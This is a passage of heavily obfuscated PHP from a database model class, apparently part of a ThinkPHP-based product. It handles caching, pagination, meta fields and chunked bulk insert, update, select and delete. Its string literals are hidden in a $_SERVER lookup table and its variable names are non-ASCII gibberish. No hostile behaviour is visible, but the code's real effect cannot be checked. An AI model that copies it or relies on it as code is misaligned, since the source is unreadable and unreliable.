Cache::set($‘Ç«Ëß‹, $Ûåó‚›¤); } return $Ûåó‚›¤; } public function cacheFunctionClear($Ïã¿Øí, $ÉÇÆçş‚, $¶¾³Œ…ô = '') { $Ò¤óÑœµ = $ÉÇÆçş‚; if (!is_array($ÉÇÆçş‚)) { $Ò¤óÑœµ = array($ÉÇÆçş‚); } foreach ($Ò¤óÑœµ as $¦â±­íÆ) { $È‚×¯Ÿ = $this->cacheKeyMake($Ïã¿Øí, $¦â±­íÆ, $¶¾³Œ…ô); Cache::remove($È‚×¯Ÿ); } } public function cacheKeyMake($ÚÔ——œ÷, $Œê ı, $ùÕ Í¬) { $²â¶‚™£ =& $_SERVER[Ï×Œõ”û]; if ($ùÕ Í¬) { $Œê ı = $Œê ı . $²â¶‚™£[438] . $ùÕ Í¬; } return get_class($this) . $²â¶‚™£[11] . $ÚÔ——œ÷ . $²â¶‚™£[439] . $Œê ı; } protected function selectPageReset() { $­¥—­Ê¸ =& $_SERVER[Ï×Œõ”û]; if (isset($GLOBALS[$­¥—­Ê¸[440]])) { return; } $GLOBALS[$­¥—­Ê¸[440]] = isset($GLOBALS[$­¥—­Ê¸[7]][$­¥—­Ê¸[441]]) ? $GLOBALS[$­¥—­Ê¸[7]][$­¥—­Ê¸[441]] : !1; $GLOBALS[$­¥—­Ê¸[442]] = isset($GLOBALS[$­¥—­Ê¸[7]][$­¥—­Ê¸[430]]) ? $GLOBALS[$­¥—­Ê¸[7]][$­¥—­Ê¸[430]] : !1; $GLOBALS[$­¥—­Ê¸[7]][$­¥—­Ê¸[441]] = !1; $GLOBALS[$­¥—­Ê¸[7]][$­¥—­Ê¸[430]] = !1; } protected function selectPageRestore() { $Õİ¿ê’Ö =& $_SERVER[Ï×Œõ”û]; if (!isset($GLOBALS[$Õİ¿ê’Ö[440]])) { return; } $GLOBALS[$Õİ¿ê’Ö[7]][$Õİ¿ê’Ö[441]] = $GLOBALS[$Õİ¿ê’Ö[440]]; $GLOBALS[$Õİ¿ê’Ö[7]][$Õİ¿ê’Ö[430]] = $GLOBALS[$Õİ¿ê’Ö[442]]; if ($GLOBALS[$Õİ¿ê’Ö[7]][$Õİ¿ê’Ö[441]] === !1) { unset($GLOBALS[$Õİ¿ê’Ö[7]][$Õİ¿ê’Ö[441]]); } if ($GLOBALS[$Õİ¿ê’Ö[7]][$Õİ¿ê’Ö[430]] === !1) { unset($GLOBALS[$Õİ¿ê’Ö[7]][$Õİ¿ê’Ö[430]]); } unset($GLOBALS[$Õİ¿ê’Ö[440]]); unset($GLOBALS[$Õİ¿ê’Ö[442]]); } protected function selectPage($´ô†á× = 200, $ı°ñÇöÜ = 1) { $üÜ½ùô© =& $_SERVER[Ï×Œõ”û]; global $in; $ç€ãË‡ı = $this->optionsValue(); $‘Äâà› = 50000; $´ô†á× = isset($in[$üÜ½ùô©[441]]) && $in[$üÜ½ùô©[441]] ? $in[$üÜ½ùô©[441]] : $´ô†á×; if ($´ô†á× === -1) { $in[$üÜ½ùô©[441]] = !1; $‘Äâà› = 100000000; $´ô†á× = $‘Äâà›; } $Øº½ğØ† = $ç€ãË‡ı; $Øº½ğØ†[$üÜ½ùô©[443]] = array(); $´ô†á× = intval($´ô†á×); $´ô†á× = $´ô†á× <= 5 ? 5 : ($´ô†á× >= $‘Äâà› ? $‘Äâà› : $´ô†á×); $ı°ñÇöÜ = intval(isset($in[$üÜ½ùô©[430]]) && $in[$üÜ½ùô©[430]] ? $in[$üÜ½ùô©[430]] : $ı°ñÇöÜ); $ı°ñÇöÜ = $ı°ñÇöÜ <= 1 ? 1 : $ı°ñÇöÜ; $ŞŒÜÆ÷… = array(); $™©î…‘© = 1; if ($ı°ñÇöÜ == 1 && $™©î…‘©) { $this->optionsValue($ç€ãË‡ı); $ŞŒÜÆ÷… = $this->page($ı°ñÇöÜ, $´ô†á×)->select(); $À€²ã·† = is_array($ŞŒÜÆ÷…) ? count($ŞŒÜÆ÷…) : 0; if ($À€²ã·† < $´ô†á×) { $êÓ™ì = 1; } else { $this->optionsValue($Øº½ğØ†); $À€²ã·† = intval($this->count()); $êÓ™ì = ceil($À€²ã·† / $´ô†á×); } } else { $this->optionsValue($Øº½ğØ†); $À€²ã·† = intval($this->count()); $êÓ™ì = ceil($À€²ã·† / $´ô†á×); $ı°ñÇöÜ = $ı°ñÇöÜ >= $êÓ™ì ? $êÓ™ì : $ı°ñÇöÜ; $this->optionsValue($ç€ãË‡ı); $ŞŒÜÆ÷… = $this->page($ı°ñÇöÜ, $´ô†á×)->select(); } if (!is_array($ŞŒÜÆ÷…)) { $ŞŒÜÆ÷… = array(); } if ($êÓ™ì == 1) { $À€²ã·† = count($ŞŒÜÆ÷…); } $³–÷äí = array($üÜ½ùô©[444] => array($üÜ½ùô©[445] => $À€²ã·†, $üÜ½ùô©[441] => $´ô†á×, $üÜ½ùô©[430] => $ı°ñÇöÜ, $üÜ½ùô©[446] => $êÓ™ì), $üÜ½ùô©[447] => $ŞŒÜÆ÷…); return $³–÷äí; } protected function checkLength($î¢®Üøë, $¶Ÿ´¶ÂÂ = 0, $±»úÊ§µ = '') { $×İÑ¥†« =& $_SERVER[Ï×Œõ”û]; $¶Ÿ´¶ÂÂ = $¶Ÿ´¶ÂÂ ? $¶Ÿ´¶ÂÂ : 65536; if (!$î¢®Üøë || strlen($î¢®Üøë) < $¶Ÿ´¶ÂÂ) { return; } $±»úÊ§µ = $±»úÊ§µ ? $±»úÊ§µ . $×İÑ¥†«[74] : $×İÑ¥†«[12]; show_json($±»úÊ§µ . LNG($×İÑ¥†«[448]) . "\x28{$¶Ÿ´¶ÂÂ}\51", !1); } protected function metaSet($­‘›«ÈØ, $ê²³¯Äš = null, $ñõ÷â¯ = null) { $“Ë˜æô =& $_SERVER[Ï×Œõ”û]; if (!$this->tableMeta || !$­‘›«ÈØ) { return !1; } $¤ôáá²ı = $this->tableMeta[$“Ë˜æô[449]]; $§ğ«ÍùÈ = $this->tableMeta[$“Ë˜æô[450]]; $àç©ƒÁ = Model($§ğ«ÍùÈ); $õƒäŠ·° = array($¤ôáá²ı => $­‘›«ÈØ, $“Ë˜æô[451] => $ê²³¯Äš); if (is_null($ê²³¯Äš)) { return $àç©ƒÁ->where(array($¤ôáá²ı => $­‘›«ÈØ))->delete(); } if (is_null($ñõ÷â¯) && is_string($ê²³¯Äš)) { return $àç©ƒÁ->where($õƒäŠ·°)->delete(); } $Ÿ¡Ğê¬Ê = is_array($ê²³¯Äš) ? $ê²³¯Äš : array(); if (is_string($ê²³¯Äš)) { $Ÿ¡Ğê¬Ê[$ê²³¯Äš] = $ñõ÷â¯; } $†íìö‰— = array(); foreach ($Ÿ¡Ğê¬Ê as $§¦Ğ¥Şµ => $«¦°íÒ™) { if (is_null($«¦°íÒ™) && is_string($§¦Ğ¥Şµ)) { $àç©ƒÁ->where(array($¤ôáá²ı => $­‘›«ÈØ, $“Ë˜æô[451] => $§¦Ğ¥Şµ))->delete(); continue; } $this->checkLength($«¦°íÒ™, !1, $§ğ«ÍùÈ . $“Ë˜æô[4] . $§¦Ğ¥Şµ); $†íìö‰—[] = array($¤ôáá²ı => $­‘›«ÈØ, $“Ë˜æô[95] => $§¦Ğ¥Şµ, $“Ë˜æô[452] => $«¦°íÒ™); } $ş°Áû‚– = $“Ë˜æô[453] . $§ğ«ÍùÈ; CacheLock::lock($ş°Áû‚–); $àç©ƒÁ->where(array($¤ôáá²ı => $­‘›«ÈØ))->addAll($†íìö‰—, array(), !0); CacheLock::unlock($ş°Áû‚–); return !0; } public function metaGet($‚øşçÔà, $µœÂéı– = false) { $Í¹¼¤¨ù =& $_SERVER[Ï×Œõ”û]; if (!$this->tableMeta) { return array(); } $†–ª£í– = $this->tableMeta[$Í¹¼¤¨ù[449]]; $¬îüŸ“ = Model($this->tableMeta[$Í¹¼¤¨ù[450]]); if ($µœÂéı–) { $È¿ñºã‰ = array($†–ª£í– => $‚øşçÔà, $Í¹¼¤¨ù[95] => $µœÂéı–); return $¬îüŸ“->where($È¿ñºã‰)->getField($Í¹¼¤¨ù[452]); } $È¿ñºã‰ = array($†–ª£í– => $‚øşçÔà); $·±÷€Ÿˆ = $¬îüŸ“->field($Í¹¼¤¨ù[454])->where($È¿ñºã‰)->select(); $·±÷€Ÿˆ = array_to_keyvalue($·±÷€Ÿˆ, $Í¹¼¤¨ù[95], $Í¹¼¤¨ù[452]); return $·±÷€Ÿˆ; } private function checkDataAutoHas($Æ€Æ³ï) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $ÓØó¡…ê) { if (in_array($Æ€Æ³ï, explode($_SERVER[Ï×Œõ”û][50], $ÓØó¡…ê[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$Ãé‡Ãò, $²Ş·óŒ) { $„è©ºøà =& $_SERVER[Ï×Œõ”û]; if (!is_array($Ãé‡Ãò)) { return; } foreach ($this->dataAuto as $Ò¹ÓÂ‘›) { $ŸºÌé Õ = $Ò¹ÓÂ‘›[0]; if (!in_array($²Ş·óŒ, explode($„è©ºøà[50], $Ò¹ÓÂ‘›[2]))) { continue; } switch (trim($Ò¹ÓÂ‘›[3])) { case $„è©ºøà[398]: case $„è©ºøà[399]: $äÓ¾ş‚ì = $Ò¹ÓÂ‘›[1]; $Ã‚”•Â = isset($Ò¹ÓÂ‘›[4]) ? (array) $Ò¹ÓÂ‘›[4] : array(); if ($äÓ¾ş‚ì == $„è©ºøà[206] && array_key_exists($ŸºÌé Õ, $Ãé‡Ãò)) { if (!$Ãé‡Ãò[$ŸºÌé Õ]) { unset($Ãé‡Ãò[$ŸºÌé Õ]); } break; } if (isset($Ãé‡Ãò[$ŸºÌé Õ])) { array_unshift($Ã‚”•Â, $Ãé‡Ãò[$ŸºÌé Õ]); } if ($„è©ºøà[398] == $Ò¹ÓÂ‘›[3]) { $Ãé‡Ãò[$ŸºÌé Õ] = call_user_func_array($äÓ¾ş‚ì, $Ã‚”•Â); } else { $Ãé‡Ãò[$ŸºÌé Õ] = call_user_func_array(array(&$this, $äÓ¾ş‚ì), $Ã‚”•Â); } break; case $„è©ºøà[350]: if (isset($Ãé‡Ãò[$ŸºÌé Õ]) && $Ãé‡Ãò[$ŸºÌé Õ]) { $Ãé‡Ãò[$ŸºÌé Õ] = call_user_func_array(array(&$this, $Ò¹ÓÂ‘›[1]), array($Ãé‡Ãò[$ŸºÌé Õ])); } break; case $„è©ºøà[353]: $Ãé‡Ãò[$ŸºÌé Õ] = $Ãé‡Ãò[$Ò¹ÓÂ‘›[1]]; break; case $„è©ºøà[371]: if (isset($Ãé‡Ãò[$ŸºÌé Õ]) && !is_string($Ãé‡Ãò[$ŸºÌé Õ])) { $Ãé‡Ãò[$ŸºÌé Õ] = json_encode_force($Ãé‡Ãò[$ŸºÌé Õ]); $Ãé‡Ãò[$ŸºÌé Õ] = self::textEncode($Ãé‡Ãò[$ŸºÌé Õ]); } break; case $„è©ºøà[400]: if ($Ãé‡Ãò[$ŸºÌé Õ] === $„è©ºøà[12]) { unset($Ãé‡Ãò[$ŸºÌé Õ]); } break; case $„è©ºøà[401]: $Ãé‡Ãò[$ŸºÌé Õ] = $Ò¹ÓÂ‘›[1]; default: break; } } if ($²Ş·óŒ == $„è©ºøà[432]) { $Ö³ÔéˆÂ = strtolower($this->db->getDbType()); if (strpos($Ö³ÔéˆÂ, $„è©ºøà[13]) !== 0) { return; } $¿”È©½Ğ = $this->field(!0)->fields; $ßº—ğ†† = $¿”È©½Ğ[$„è©ºøà[331]]; if (isset($¿”È©½Ğ[$„è©ºøà[330]])) { unset($ßº—ğ††[$¿”È©½Ğ[$„è©ºøà[330]]]); } foreach ($ßº—ğ†† as $ÌïØû·æ => $²Ş·óŒ) { if (!isset($Ãé‡Ãò[$ÌïØû·æ])) { $Ãé‡Ãò[$ÌïØû·æ] = $„è©ºøà[12]; } } } } private function dataAfterFilter(&$××‡€õ’) { $ë†·ã­Î =& $_SERVER[Ï×Œõ”û]; foreach ($this->dataAuto as $ğ«úÑ­) { $Ø‡åëª‰ = $ğ«úÑ­[0]; if (!isset($××‡€õ’[$Ø‡åëª‰])) { continue; } if (!in_array($ë†·ã­Î[434], explode($ë†·ã­Î[50], $ğ«úÑ­[2]))) { continue; } switch (trim($ğ«úÑ­[3])) { case $ë†·ã­Î[398]: case $ë†·ã­Î[399]: $Ö×ƒ‰Ì = isset($ğ«úÑ­[4]) ? (array) $ğ«úÑ­[4] : array(); array_unshift($Ö×ƒ‰Ì, $××‡€õ’[$Ø‡åëª‰]); if (isset($ğ«úÑ­[4]) && $ğ«úÑ­[4] == $ë†·ã­Î[455]) { $Ö×ƒ‰Ì = array($××‡€õ’[$Ø‡åëª‰]); } if ($ë†·ã­Î[398] == $ğ«úÑ­[3]) { $××‡€õ’[$Ø‡åëª‰] = call_user_func_array($ğ«úÑ­[1], $Ö×ƒ‰Ì); } else { $××‡€õ’[$Ø‡åëª‰] = call_user_func_array(array(&$this, $ğ«úÑ­[1]), $Ö×ƒ‰Ì); } break; case $ë†·ã­Î[350]: if (isset($××‡€õ’[$Ø‡åëª‰]) && $××‡€õ’[$Ø‡åëª‰]) { $××‡€õ’[$Ø‡åëª‰] = call_user_func_array(array(&$this, $ğ«úÑ­[1]), array($××‡€õ’[$Ø‡åëª‰])); } break; case $ë†·ã­Î[353]: $××‡€õ’[$Ø‡åëª‰] = $××‡€õ’[$ğ«úÑ­[1]]; break; case $ë†·ã­Î[371]: $³ŸÀÙ‹¬ = $××‡€õ’[$Ø‡åëª‰]; $³ŸÀÙ‹¬ = self::textDecode($³ŸÀÙ‹¬); $××‡€õ’[$Ø‡åëª‰] = json_decode($³ŸÀÙ‹¬, !0); if (is_null($××‡€õ’[$Ø‡åëª‰])) { $××‡€õ’[$Ø‡åëª‰] = $³ŸÀÙ‹¬; } break; case $ë†·ã­Î[400]: if ($××‡€õ’[$Ø‡åëª‰] === $ë†·ã­Î[12]) { unset($××‡€õ’[$Ø‡åëª‰]); } break; case $ë†·ã­Î[401]: $××‡€õ’[$Ø‡åëª‰] = $ğ«úÑ­[1]; break; default: break; } } } public function saveAll($‹ŸÙïºÓ, $€×‹¹õ¿ = false) { $¡«Æª´ =& $_SERVER[Ï×Œõ”û]; $ËØ¨©ì = $this->db; $”À÷‡ÔÊ = $this->tablePrefix . $this->tableName; $ïü·×¶Ó = $this->saveAllChunkMake($‹ŸÙïºÓ); $€×‹¹õ¿ = is_array($€×‹¹õ¿) ? $€×‹¹õ¿ : array(); foreach ($ïü·×¶Ó as $Ü©ä„£Æ) { $˜°ßÉ´µ = $¡«Æª´[12]; $¥Ò¬î¼Ğ = $¡«Æª´[12]; $õæÜºÌŞ = array(); $¡éñ¢º = array(); foreach ($Ü©ä„£Æ as $ƒÃã¦†“ => $·úëµ÷) { $˜°ßÉ´µ = $·úëµ÷[$¡«Æª´[456]]; $¡éñ¢º[] = $·úëµ÷[$¡«Æª´[457]]; $·ñ± Ì¹ = $ËØ¨©ì->parseValue($·úëµ÷[$¡«Æª´[457]]); foreach ($·úëµ÷[$¡«Æª´[458]] as $à×øÀíë => $×ËÇÖ…) { if (!$õæÜºÌŞ[$à×øÀíë]) { $õæÜºÌŞ[$à×øÀíë] = array(); } $õæÜºÌŞ[$à×øÀíë][] = $¡«Æª´[459] . $·ñ± Ì¹ . $¡«Æª´[460] . $ËØ¨©ì->parseValue($×ËÇÖ…); } } $‚€µÃ÷Ú = $˜°ßÉ´µ; $‚€µÃ÷Ú = $ËØ¨©ì->parseKey($‚€µÃ÷Ú); foreach ($õæÜºÌŞ as $à×øÀíë => $ºµ–ùŠ) { $¥Ò¬î¼Ğ .= $¡«Æª´[287] . $ËØ¨©ì->parseKey($à×øÀíë) . $¡«Æª´[461] . $‚€µÃ÷Ú . $¡«Æª´[462]; $¥Ò¬î¼Ğ .= implode($¡«Æª´[287], $ºµ–ùŠ) . $¡«Æª´[463]; } $˜×â‡Î = $€×‹¹õ¿; $˜×â‡Î[$˜°ßÉ´µ] = array($¡«Æª´[7], $¡éñ¢º); $Óßîú® = "\125\120\104\101\124\105\40\140{$”À÷‡ÔÊ}\x60\x20\x53\105\x54\x20" . rtrim($¥Ò¬î¼Ğ, $¡«Æª´[50]) . $¡«Æª´[287] . $ËØ¨©ì->parseWhere($˜×â‡Î); $this->execute($Óßîú®); $this->chunkEventCheck(count($Ü©ä„£Æ)); } $this->chunkEventSet(); } public function saveAllEach($ğûı­Ñ„, $”ÈŒ±Û© = false) { $ãÔ¸³È =& $_SERVER[Ï×Œõ”û]; $Á¹ĞµæÎ = $this->db; $ö“«û = $this->tablePrefix . $this->tableName; $ò Ÿ©úÊ = $this->saveAllChunkMake($ğûı­Ñ„); $”ÈŒ±Û© = is_array($”ÈŒ±Û©) ? $”ÈŒ±Û© : array(); foreach ($ò Ÿ©úÊ as $™¯Ô‰õ–) { foreach ($™¯Ô‰õ– as $ÂÛÅÓ«† => $¸²ùúÛı) { $š»â¤Îû = $ãÔ¸³È[464]; foreach ($¸²ùúÛı[$ãÔ¸³È[458]] as $­é˜Ş•° => $œÀ°ÓÍí) { $š»â¤Îû .= $Á¹ĞµæÎ->parseKey($­é˜Ş•°) . $ãÔ¸³È[465] . $Á¹ĞµæÎ->parseValue($œÀ°ÓÍí) . $ãÔ¸³È[50]; } $ÓÉ˜ÖÄï = $”ÈŒ±Û©; $ÓÉ˜ÖÄï[$¸²ùúÛı[$ãÔ¸³È[456]]] = $¸²ùúÛı[$ãÔ¸³È[457]]; $ş¤Ú¶º¯ = "\x55\120\104\101\124\105\x20\x60{$ö“«û}\x60\x20\x53\105\x54\x20" . rtrim($š»â¤Îû, $ãÔ¸³È[50]) . $ãÔ¸³È[466] . $Á¹ĞµæÎ->parseWhere($ÓÉ˜ÖÄï) . $ãÔ¸³È[467]; $this->execute($ş¤Ú¶º¯); } $this->chunkEventCheck(count($™¯Ô‰õ–)); } $this->chunkEventSet(); } private function saveAllChunkMake($´êÂğ¶è) { $ê¸ÀÌğ¦ =& $_SERVER[Ï×Œõ”û]; $úÖ’¸«´ = self::SQL_WHERE_IN_CHUNK; $´êÂğ¶è = is_array($´êÂğ¶è) ? $´êÂğ¶è : array(); $üä™ˆê— = array(); $È‹‹ã’¶ = ceil(count($´êÂğ¶è) / $úÖ’¸«´); for ($å¨Ê†â‘ = 0; $å¨Ê†â‘ < $È‹‹ã’¶; $å¨Ê†â‘++) { $Å¯êßøŸ = array(); $©áúÂÇ = array_slice($´êÂğ¶è, $å¨Ê†â‘ * $úÖ’¸«´, $úÖ’¸«´); foreach ($©áúÂÇ as $ä„¼™‰Š) { if (!is_array($ä„¼™‰Š) || count($ä„¼™‰Š) < 4 || count($ä„¼™‰Š) % 2 != 0) { continue; } $±ÒÚ¤ÕÀ = array(); for ($ê±ÉŒ¯ø = 2; $ê±ÉŒ¯ø < count($ä„¼™‰Š); $ê±ÉŒ¯ø += 2) { $±ÒÚ¤ÕÀ[$ä„¼™‰Š[$ê±ÉŒ¯ø]] = $ä„¼™‰Š[$ê±ÉŒ¯ø + 1]; } $Å¯êßøŸ[] = array($ê¸ÀÌğ¦[456] => $ä„¼™‰Š[0], $ê¸ÀÌğ¦[457] => $ä„¼™‰Š[1], $ê¸ÀÌğ¦[458] => $±ÒÚ¤ÕÀ); } $üä™ˆê—[] = $Å¯êßøŸ; } return $üä™ˆê—; } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($ş¯ã²¸˜ = false, $¶õ“Üñ = false) { $this->_chunkEvent = $ş¯ã²¸˜; $this->_chunkEventParam = $¶õ“Üñ; } private function chunkEventCheck($øÄŞî¼) { if (!$this->_chunkEvent) { return; } $ØäìÜçÈ = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $ØäìÜçÈ[$_SERVER[Ï×Œõ”û][468]] = $øÄŞî¼; Hook::trigger($this->_chunkEvent, $ØäìÜçÈ); } public function addAll($Â¬Åâ›Ÿ, $Ïå—»â¹ = array(), $¦Ù¨ğİ½ = false) { $ûıá¡§ø =& $_SERVER[Ï×Œõ”û]; ignore_timeout(); $‰ğºÈ¾½ = self::SQL_WHERE_IN_CHUNK; if (empty($Â¬Åâ›Ÿ)) { $this->error = think_lang($ûıá¡§ø[351]); return !1; } $Ïå—»â¹ = $this->_parseOptions($Ïå—»â¹); foreach ($Â¬Åâ›Ÿ as $–ŠÃ›º… => $Ø§ÚáÍ´) { $Â¬Åâ›Ÿ[$–ŠÃ›º…] = $this->_facade($Ø§ÚáÍ´); $this->_beforeInsert($Â¬Åâ›Ÿ[$–ŠÃ›º…], $Ïå—»â¹); } if (method_exists($this->db, $ûıá¡§ø[352])) { for ($ì¼İüÁÔ = 0; $ì¼İüÁÔ < count($Â¬Åâ›Ÿ); $ì¼İüÁÔ += $‰ğºÈ¾½) { $ŸäÄºæ = array_slice($Â¬Åâ›Ÿ, $ì¼İüÁÔ, $‰ğºÈ¾½); if (!is_array($ŸäÄºæ) || count($ŸäÄºæ) == 0) { break; } $ùÚ¬ì÷Æ = $this->db->insertAll($ŸäÄºæ, $Ïå—»â¹, $¦Ù¨ğİ½); $this->chunkEventCheck(count($ŸäÄºæ)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($Â¬Åâ›Ÿ as $–ŠÃ›º… => $Ø§ÚáÍ´) { $ùÚ¬ì÷Æ = $this->db->insert($Ø§ÚáÍ´, $Ïå—»â¹, $¦Ù¨ğİ½); } $this->commit(); } if (!1 !== $ùÚ¬ì÷Æ) { $½£Õ´Ê = $this->getLastInsID(); if ($½£Õ´Ê) { return $½£Õ´Ê; } } return $ùÚ¬ì÷Æ; } public function save($ò¾ˆ‹¨ = '', $Ñ…„–ª = array()) { $…ÆœÏ£ =& $_SERVER[Ï×Œõ”û]; $ÂË–ãàÁ = self::SQL_WHERE_IN_CHUNK; $£ª“Î¤í = $this->optionsValue(); $îÎê¸Ôô = $this->findWhereField($£ª“Î¤í); if (!$îÎê¸Ôô) { return parent::save($ò¾ˆ‹¨, $Ñ…„–ª); } $ÔøÍêê– = 0; $¯İéÔ¼Ò = $£ª“Î¤í[$…ÆœÏ£[355]][$îÎê¸Ôô][1]; $¯İéÔ¼Ò = is_array($¯İéÔ¼Ò) ? $¯İéÔ¼Ò : array(); $¿¶ÛÛÕ = count($¯İéÔ¼Ò); for ($••çÂß· = 0; $••çÂß· < $¿¶ÛÛÕ; $••çÂß· += $ÂË–ãàÁ) { $¾Ì•¤Øª = array_slice($¯İéÔ¼Ò, $••çÂß·, $ÂË–ãàÁ); if (!is_array($¾Ì•¤Øª) || count($¾Ì•¤Øª) == 0) { break; } $£ª“Î¤í[$…ÆœÏ£[355]][$îÎê¸Ôô][1] = $¾Ì•¤Øª; $this->optionsValue($£ª“Î¤í); $ÔøÍêê– += parent::save($ò¾ˆ‹¨, $Ñ…„–ª); $this->chunkEventCheck(count($¾Ì•¤Øª)); } $this->chunkEventSet(); return $ÔøÍêê–; } public function add($˜Äı¨™ = '', $‚óö“•ã = array(), $îæ®ã²Í = false) { if ($this->addTaskStatus && is_array($˜Äı¨™)) { $this->addTaskData[] = $˜Äı¨™; return; } return parent::add($˜Äı¨™, $‚óö“•ã, $îæ®ã²Í); } public function parseWhereLike($´ÉÂ’œ•, $ÍëÏÃİ÷ = '', $ß”•ê¤Ã = false, &$ú²’ƒ† = false) { $óÙÊÓ¢Ô =& $_SERVER[Ï×Œõ”û]; $ü˜ı€Ø¹ = $GLOBALS[$óÙÊÓ¢Ô[6]][$óÙÊÓ¢Ô[469]]; if (!$ü˜ı€Ø¹[$óÙÊÓ¢Ô[470]]) { return $´ÉÂ’œ•; } if (!is_array($´ÉÂ’œ•)) { return $´ÉÂ’œ•; } $˜ó üÈâ = array(); $­ÎƒĞ—­ = 0; foreach ($´ÉÂ’œ• as $å–•˜í³ => $§ãû‘ÔÎ) { if (is_array($§ãû‘ÔÎ) && count($§ãû‘ÔÎ) == 2 && $§ãû‘ÔÎ[0] == $óÙÊÓ¢Ô[471] && is_string($§ãû‘ÔÎ[1]) && substr($§ãû‘ÔÎ[1], 0, 1) == $óÙÊÓ¢Ô[472] && substr($§ãû‘ÔÎ[1], strlen($§ãû‘ÔÎ[1]) - 1, 1) == $óÙÊÓ¢Ô[472]) { $ú²’ƒ† = !0; $¨‘‹¤û = is_string($å–•˜í³) ? $å–•˜í³ : $ÍëÏÃİ÷; $–µ‡ƒ¶è = substr($§ãû‘ÔÎ[1], 1, strlen($§ãû‘ÔÎ[1]) - 2); $–µ‡ƒ¶è = $this->db->escapeString($–µ‡ƒ¶è); if (!strpos($¨‘‹¤û, $óÙÊÓ¢Ô[10])) { $¨‘‹¤û = $óÙÊÓ¢Ô[473] . $¨‘‹¤û . $óÙÊÓ¢Ô[473]; } $‹º¸·æô = $óÙÊÓ¢Ô[222] . $–µ‡ƒ¶è . $óÙÊÓ¢Ô[222]; $–µ‡ƒ¶è = str_replace(array($óÙÊÓ¢Ô[10], $óÙÊÓ¢Ô[474], $óÙÊÓ¢Ô[11]), $óÙÊÓ¢Ô[475], $–µ‡ƒ¶è); if ($ü˜ı€Ø¹[$óÙÊÓ¢Ô[476]]) { $‹º¸·æô = $óÙÊÓ¢Ô[477] . $–µ‡ƒ¶è . $óÙÊÓ¢Ô[478]; if ($ü˜ı€Ø¹[$óÙÊÓ¢Ô[479]]) { $‹º¸·æô = $óÙÊÓ¢Ô[478] . $–µ‡ƒ¶è . $óÙÊÓ¢Ô[477]; } } $˜ó üÈâ[$­ÎƒĞ—­] = $óÙÊÓ¢Ô[480] . $¨‘‹¤û . $óÙÊÓ¢Ô[481] . $‹º¸·æô . $óÙÊÓ¢Ô[482]; $­ÎƒĞ—­++; continue; } if (is_array($§ãû‘ÔÎ)) { $ÍëÏÃİ÷ = is_string($å–•˜í³) ? $å–•˜í³ : $ÍëÏÃİ÷; $§ãû‘ÔÎ = $this->parseWhereLike($§ãû‘ÔÎ, $ÍëÏÃİ÷, !0, $ú²’ƒ†); } if (is_numeric($å–•˜í³)) { $˜ó üÈâ[$­ÎƒĞ—­] = $§ãû‘ÔÎ; $­ÎƒĞ—­++; } else { $˜ó üÈâ[$å–•˜í³] = $§ãû‘ÔÎ; } } if ($ú²’ƒ† && !$ß”•ê¤Ã) { } return $˜ó üÈâ; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($ÎºÜ•° = array()) { $æÒçÄæï =& $_SERVER[Ï×Œõ”û]; $€Ó­…€ = self::SQL_WHERE_IN_CHUNK; $¤ƒ„õ¤ = $this->optionsValue(); $ÍûìòíŸ = $this->findWhereField($¤ƒ„õ¤); if (!$ÍûìòíŸ || isset($¤ƒ„õ¤[$æÒçÄæï[370]]) || isset($¤ƒ„õ¤[$æÒçÄæï[430]])) { return parent::select($ÎºÜ•°); } $ßªğ¾Áê = $¤ƒ„õ¤[$æÒçÄæï[355]][$ÍûìòíŸ][1]; $ßªğ¾Áê = is_array($ßªğ¾Áê) ? $ßªğ¾Áê : array(); $âåÓğíŠ = null; for ($æ©ïÉ“Ï = 0; $æ©ïÉ“Ï < count($ßªğ¾Áê); $æ©ïÉ“Ï += $€Ó­…€) { $óÀú«ßâ = array_slice($ßªğ¾Áê, $æ©ïÉ“Ï, $€Ó­…€); if (!is_array($óÀú«ßâ) || count($óÀú«ßâ) == 0) { break; } $¤ƒ„õ¤[$æÒçÄæï[355]][$ÍûìòíŸ][1] = $óÀú«ßâ; $this->optionsValue($¤ƒ„õ¤); $Ù¬²ˆ…· = parent::select($ÎºÜ•°); if (!$Ù¬²ˆ…·) { continue; } $âåÓğíŠ = is_array($âåÓğíŠ) ? $âåÓğíŠ : array(); $âåÓğíŠ = array_merge($âåÓğíŠ, $Ù¬²ˆ…·); } return $âåÓğíŠ; } public function delete($óÖÈ¹Ë = array()) { $½üŒŸ =& $_SERVER[Ï×Œõ”û]; $Ù½¼¤ì¨ = self::SQL_WHERE_IN_CHUNK; $ğÃÄ„€š = $this->optionsValue(); $øÇ€®¶° = $this->findWhereField($ğÃÄ„€š); if (!$øÇ€®¶°) { return parent::delete($óÖÈ¹Ë); } $ô¨Úéï¬ = 0; $ŒÁÑ¢àÒ = $ğÃÄ„€š[$½üŒŸ[355]][$øÇ€®¶°][1]; $ŒÁÑ¢àÒ = is_array($ŒÁÑ¢àÒ) ? $ŒÁÑ¢àÒ : array(); for ($Ñ¥İ§¢£ = 0; $Ñ¥İ§¢£ < count($ŒÁÑ¢àÒ); $Ñ¥İ§¢£ += $Ù½¼¤ì¨) { $Š™İ‡ˆ· = array_slice($ŒÁÑ¢àÒ, $Ñ¥İ§¢£, $Ù½¼¤ì¨); if (!is_array($Š™İ‡ˆ·) || count($Š™İ‡ˆ·) == 0) { break; } $ğÃÄ„€š[$½üŒŸ[355]][$øÇ€®¶°][1] = $Š™İ‡ˆ·; $this->optionsValue($ğÃÄ„€š); $ô¨Úéï¬ += parent::delete($óÖÈ¹Ë); } return $ô¨Úéï¬; } private function findWhereField($››»«“ı) { $±ò¡À” =& $_SERVER[Ï×Œõ”û]; $Ñ’ˆ‹÷ = self::SQL_WHERE_IN_CHUNK; if (!is_array($››»«“ı) || !is_array($››»«“ı[$±ò¡À”[355]])) { return !1; } foreach ($››»«“ı[$±ò¡À”[355]] as $íŒüÀŒ => $ãşò±°Ì) { if (is_array($ãşò±°Ì) && isset($ãşò±°Ì[0]) && is_string($ãşò±°Ì[0]) && strtolower($ãşò±°Ì[0]) == $±ò¡À”[7] && is_array($ãşò±°Ì[1]) && 